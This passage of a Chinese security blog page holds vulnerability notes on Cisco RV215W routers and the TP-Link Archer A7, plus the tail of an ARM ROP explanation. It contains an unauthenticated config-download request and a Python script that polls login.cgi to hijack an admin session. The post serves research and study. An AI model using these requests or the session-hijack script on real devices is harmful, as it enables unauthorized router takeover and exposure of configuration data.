<li>栈顶第一个元素（system_addr）弹出到R3寄存器，第二个元素(gadget2：mov r0, sp ; blx r3})弹出到PC，使程序流执行到gadget2；</li>
<li>此时的栈顶内容（cmd）放入R0寄存器，并使程序跳转到R3寄存器指向的地址去执行。</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://www.anquanke.com/post/id/204403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204403</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/06/09/iot/Cisco设备多个漏洞的分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/09/iot/Cisco设备多个漏洞的分析/" class="post-title-link" itemprop="url">Cisco设备多个漏洞的分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-09 14:41:33" itemprop="dateCreated datePublished" datetime="2021-06-09T14:41:33+08:00">2021-06-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:16:40" itemprop="dateModified" datetime="2022-02-21T16:16:40+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="Cisco设备多个漏洞的分析"><a href="#Cisco设备多个漏洞的分析" class="headerlink" title="Cisco设备多个漏洞的分析"></a>Cisco设备多个漏洞的分析</h1><h2 id="CVE-2020-3150：信息泄漏"><a href="#CVE-2020-3150：信息泄漏" class="headerlink" title="CVE-2020-3150：信息泄漏"></a>CVE-2020-3150：信息泄漏</h2><ul>
<li>未经身份验证的配置导出</li>
<li>前提<ul>
<li>管理员用户需要打开backup.asp页面（在最近一次重启后</li>
<li>一旦访问此页面，则httpd二进制文件会设置一个flag，允许产生startup.cfg文件 (设置的flag保存在/tmp/config.txt).</li>
<li>访问startup.cfg文件</li>
</ul>
</li>
<li>原因：对URL的访问控制不当</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/startup.cfg</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> Ok</span><br><span class="line"><span class="attribute">Server</span>: httpd</span><br><span class="line"><span class="attribute">Date</span>: Fri, 01 Jan 2010 00:01:46 GMT</span><br><span class="line"><span class="attribute">Content-Disposition</span>: attachment; filename=RV215W_startup.cfg</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line">;RV215W Configuration File - Version: 1.1.0.5</span><br><span class="line">;MAC address: 10:BD:18:AC:57:3A</span><br><span class="line">;Serial Number: CCQ231407B9</span><br><span class="line">;The checksum: 8A41D8E444067386</span><br><span class="line">--snip--</span><br></pre></td></tr></table></figure>
<ul>
<li>其他文件也会受到影响，但取决于安装程序，例如mirror.cfg或backup.cfg</li>
</ul>
<h2 id="CVE-2020-3145：栈溢出-RCE"><a href="#CVE-2020-3145：栈溢出-RCE" class="headerlink" title="CVE-2020-3145：栈溢出/RCE"></a>CVE-2020-3145：栈溢出/RCE</h2><ul>
<li>需要通过认证（注意如下有session_id</li>
<li>多处strcpy栈溢出</li>
<li>POST /apply.cgi;session_id=b37f0e917e54a1af0e1d7a0027d9de5d HTTP/1.1、post数据的wizard_pppoe_pname字段</li>
</ul>
<h2 id="CVE-2020-3146"><a href="#CVE-2020-3146" class="headerlink" title="CVE-2020-3146"></a>CVE-2020-3146</h2><ul>
<li>类似3145</li>
</ul>
<h2 id="CVE-2020-3144：认证绕过"><a href="#CVE-2020-3144：认证绕过" class="headerlink" title="CVE-2020-3144：认证绕过"></a>CVE-2020-3144：认证绕过</h2><p>//here，未完待续</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login.cgi</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1812</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line">submit_button=login&amp;submit_type=continue&amp;gui_action=gozilla_cgi</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"submit_button"</span>:<span class="string">"login"</span>,</span><br><span class="line">    <span class="string">"submit_type"</span>:<span class="string">"continue"</span>,</span><br><span class="line">    <span class="string">"gui_action"</span>:<span class="string">"gozila_cgi"</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(</span><br><span class="line">            <span class="string">"https://192.168.1.1/login.cgi"</span>,</span><br><span class="line">            data=payload,</span><br><span class="line">            verify=<span class="keyword">False</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Login Page"</span> <span class="keyword">in</span> resp.content:</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sessionid = re.findall(<span class="string">r"session_id=([^\"]+)"</span>, resp.content)[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">"[+] Successfully hijacked admin session. Session id is</span></span><br><span class="line"><span class="string">            &#123;&#125;"</span>.format(sessionid))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/" target="_blank" rel="noopener">https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/06/02/iot/TP-Link Archer A7漏洞分析及利用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/02/iot/TP-Link Archer A7漏洞分析及利用/" class="post-title-link" itemprop="url">TP-Link Archer A7漏洞分析及利用</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-02 14:41:33" itemprop="dateCreated datePublished" datetime="2021-06-02T14:41:33+08:00">2021-06-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:16:59" itemprop="dateModified" datetime="2022-02-21T16:16:59+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="TP-Link-Archer-A7漏洞分析及利用"><a href="#TP-Link-Archer-A7漏洞分析及利用" class="headerlink" title="TP-Link Archer A7漏洞分析及利用"></a>TP-Link Archer A7漏洞分析及利用</h1><ul>
<li><p>漏洞对比</p>
<ul>
<li><strong>Patched version :</strong> <a href="https://static.tp-link.com/2020/202003/20200313/Archer A7(US" target="_blank" rel="noopener">Archer A7(US)_V5_200220</a>_V5_200220.zip)</li>
<li><strong>Previous version :</strong> <a href="https://static.tp-link.com/2019/201908/20190816/Archer C7(US" target="_blank" rel="noopener">Archer C7(US)_V5_190726</a>_V5_190726.zip)</li>
<li>Note that Archer C7 and A7 models share most of the binaries, so technically it does not matter if we are looking at the C7 or A7 firmware image.</li>
</ul>
</li>
<li><p>定位（通过字符串</p>
<ul>
<li>漏洞描述：<strong>slave_mac</strong></li>
<li>字符串slave_mac或slave mac的引用（模糊一点好）</li>
<li>结合bindiff，排除相似度为1的</li>
</ul>
</li>
<li><p>定位（通过函数</p>
<ul>
<li>漏洞描述：<strong>system call</strong></li>
<li>system函数的引用（本二进制的，而非lib库的</li>
<li>结合bindiff，排除相似度为1的</li>
<li>要用户可控参数的，排除参数写死的</li>
</ul>
</li>
<li><p>调试</p>
<ul>
<li>./gdbserver.mipsbe 0.0.0.0:8908 /usr/bin/tdpServer</li>
<li>gdb-multiarch：set arch mips、set endian big</li>
</ul>
</li>
<li><p>tdpServer服务，运行在UDP的20002端口，可直接socket编程来测试</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">IP=<span class="string">"192.168.0.254"</span></span><br><span class="line">PORT=<span class="number">20002</span></span><br><span class="line">addr = (IP,PORT)</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">s.sendto(<span class="string">b'0x01'</span>*<span class="number">16</span>,(IP,PORT))</span><br></pre></td></tr></table></figure>
</li>
<li><p>杂乱</p>
<ul>
<li>放弃bindiffhelper，其要用到bindiff6，其mac下不行，binexport插件+bindiff5足矣</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考</p>
<ul>
<li><p>Analysis &amp; Exploitation of a Recent TP-Link Archer A7 Vulnerability，<a href="https://starlabs.sg/blog/2020/10/analysis-exploitation-of-a-recent-tp-link-archer-a7-vulnerability/" target="_blank" rel="noopener">https://starlabs.sg/blog/2020/10/analysis-exploitation-of-a-recent-tp-link-archer-a7-vulnerability/</a></p>
</li>
<li><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-334/" target="_blank" rel="noopener">https://www.zerodayinitiative.com/advisories/ZDI-20-334/</a></p>
</li>
</ul>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/28/">28</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">21Guns</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">164</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">71</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">21Guns</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

</body>
</html>
